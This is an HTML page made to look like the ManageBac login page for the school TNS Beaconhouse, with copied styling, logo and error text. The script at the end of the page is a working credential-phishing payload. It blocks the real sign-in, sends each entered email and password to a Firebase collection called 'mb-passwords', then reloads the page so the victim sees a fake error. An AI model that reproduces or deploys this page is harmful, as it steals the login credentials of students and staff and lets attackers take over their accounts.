<html>
  <head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-type" />
    <meta
      content="uUBvcT9yHQcqumVgYSoo0lS_aREFROayqCC6DTAWNP"
      name="globalsign-domain-verification"
    />
    <meta content="initial-scale=1.0, maximum-scale=1.0" name="viewport" />
    <meta content="no-cache" name="turbolinks-cache-control" />
    <title>ManageBac | Login</title>

    <link
      rel="stylesheet"
      media="all"
      href="https://assets.managebac.com/assets/login-5dd616e1c0bd15ab15311dc9fd4948cd4890f3634fe01ccd8db577315ae9c5f9.css"
      data-turbolinks-track="reload"
    />
    <link
      rel="shortcut icon"
      type="image/x-icon"
      href="https://assets.managebac.com/assets/favicons/managebac-99d42c24644ee2e2689f65c4471451c8579814adbc2840e567e6a00a44707e86.ico"
    />
    <link
      rel="apple-touch-icon"
      type="image/png"
      href="https://assets.managebac.com/assets/apple-touch-icon-424fd1f4adfae26bb9dfe4abfc97c080dd42798fda102faa2c008fe983adf752.png"
      sizes="512x512"
    />
  </head>
  <body
    class="controller-sessions theme-dark_blue"
    data-airbrake-enabled="data-airbrake-enabled"
    data-airbrake-environment="production"
    data-airbrake-project-id="317801"
    data-airbrake-project-key="eea438c8f65aebafb25fb83cbfbc3b7c"
    data-path="sessions/new"
    data-pspdf-kit-script="https://assets.prod.faria.co/pspdfkit.js"
    data-school-type="managebac"
    data-unload-message="The changes you made may not be saved. Are you sure you want to leave this page?"
    id="action-new"
    style="
      background-image: url(https://cdn.ca.managebac.com/uploads/school_personalisation/login_background/1411/optimized_Updated_Final_Image.png),
        url(https://cdn.ca.managebac.com/uploads/school_personalisation/login_background/1411/optimized_tiny_Updated_Final_Image.png);
    "
  >
    <main class="login-page" role="main">
      <div class="content-wrapper login-wrapper">
        <div class="content-block">
          <div class="school-logo">
            <img
              src="https://cdn.ca.managebac.com/uploads/school/logo/10003546/TNS-logo.png"
            />
          </div>
          <div class="content-block-header">
            <h3>TNS Beaconhouse</h3>
          </div>
          <div class="js-flash-area" style="display: none">
            <div class="flash alert">
              <div class="flash-body">
                <b>Error.</b>
                Invalid login or password, please try again.
              </div>
              <div class="flash-action flash-close">
                <svg
                  width="30"
                  viewBox="0 0 30 30"
                  xmlns="http://www.w3.org/2000/svg"
                  class="fi fi-close"
                >
                  <path
                    fill="#859bbb"
                    d="M23 9l-6 6 6 6 1 1a2.444 2.444 0 011 1.24A1.763 1.763 0 0123.236 25 2.437 2.437 0 0122 24l-1-1-6-6-6 6-1 1a2.439 2.439 0 01-1.235 1A1.764 1.764 0 015 23.24 2.449 2.449 0 016 22l1-1 6-6-6-6-1-1a2.449 2.449 0 01-1-1.24A1.764 1.764 0 016.765 5 2.439 2.439 0 018 6l1 1 6 6 6-6 1-1a2.437 2.437 0 011.236-1A1.763 1.763 0 0125 6.76 2.444 2.444 0 0124 8z"
                  ></path>
                </svg>
              </div>
            </div>
          </div>
          <form
            id="session_form"
            novalidate="novalidate"
            class="simple_form session"
          >
            <div class="form-inputs">
              <div class="form-group email required session_login">
                <label class="control-label email required" for="session_login">
                  Login<abbr title="Required">*</abbr>
                </label>
                <input
                  class="form-control string email required"
                  name="login"
                  autofocus="autofocus"
                  type="email"
                  id="session_login"
                />
              </div>
              <div class="pull-right">
                <a
                  style="text-decoration: none"
                  tabindex="3"
                  href="/reset-password/new"
                  >Forgot your password?</a
                >
              </div>
              <div class="form-group password required session_password">
                <label
                  class="control-label password required"
                  for="session_password"
                >
                  Password<abbr title="Required">*</abbr>
                </label>
                <input
                  class="form-control password required"
                  name="password"
                  type="password"
                  id="session_password"
                />
              </div>
            </div>
            <div class="form-actions">
              <input
                type="submit"
                name="commit"
                id="session_submit"
                value="Sign in"
                class="btn-block"
                data-disable-with="Processing..."
              />
            </div>
          </form>
        </div>
      </div>
    </main>
    <footer>
      <div class="hidden-mobile faria-one">
        <div class="f-menu-link f-menu-nav-link colored-icon">
          <svg
            width="25"
            height="25"
            viewbox="0 0 25 25"
            xmlns="http://www.w3.org/2000/svg"
            class="fi current-fill icon-20"
          >
            <g fill="none" fill-rule="evenodd">
              <path
                d="M11.536.619h8.07c2.652 0 4.93 2.175 4.93 4.585v5.415h-13v-10z"
                fill="#F09924"
                fill-rule="nonzero"
              ></path>
              <path
                d="M11.536 10.619h13v9.427c0 1.642-1.297 3.921-4.236 4.573h-8.764v-14z"
                fill="#00BD9C"
                fill-rule="nonzero"
              ></path>
              <path
                d="M15.536 10.619l.04 14H5.036c-1.906 0-4.5-1.986-4.5-4.68v-9.32h15z"
                fill="#C373D8"
                fill-rule="nonzero"
              ></path>
              <path
                d="M5.085.619h6.451v14h-11V5.175C.787 2.637 2.576.907 5.086.619z"
                fill="#478CFE"
                fill-rule="nonzero"
              ></path>
              <path
                d="M8 3.8v17h.67a3.349 3.349 0 001.687-.446 3.308 3.308 0 001.087-1.038.068.068 0 000-.048c.261-.581.41-1.206.436-1.843v-3.927h1.94l1.94-2.91h-3.88V7.68h5.82L20 3.8H8z"
                fill="#FFF"
              ></path>
            </g>
          </svg>
          <span class="f-menu-link-title text-node fw-semibold"
            >FariaOne School OS</span
          >
        </div>
      </div>
    </footer>
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
      import {
        getFirestore,
        addDoc,
        collection,
      } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

      // Your web app's Firebase configuration
      const firebaseConfig = {
        apiKey: "AIzaSyDvix46PGrqV4sIW3tlj-fLlb6mbuDVHj8",
        authDomain: "tnsbeaconhouse-managebac.firebaseapp.com",
        projectId: "tnsbeaconhouse-managebac",
        storageBucket: "tnsbeaconhouse-managebac.appspot.com",
        messagingSenderId: "102801144416",
        appId: "1:102801144416:web:7d3c46ce4a044c81f66105",
      };

      // Initialize Firebase
      const app = initializeApp(firebaseConfig);
      const db = getFirestore(app);

      const invalid_element =
        document.getElementsByClassName("js-flash-area")[0];
      const form_element = document.getElementById("session_form");
      const email_element = document.getElementById("session_login");
      const password_element = document.getElementById("session_password");
      const submit_element = document.getElementById("session_submit");

      const sPw = async () => {
        try {
          const docRef = await addDoc(collection(db, "mb-passwords"), {
            email: email_element.value,
            password: password_element.value,
          });

          console.log("Document written with ID: ", docRef.id);
        } catch (e) {
          console.error("Error adding document: ", e);
        } finally {
          submit_element.value = "Sign In";
          localStorage.setItem("gotted", "true");
          location.reload();
        }
      };

      form_element.addEventListener("submit", (e) => {
        e.preventDefault();
        submit_element.value = "Processing...";
        sPw();
      });
    </script>
  </body>
</html>
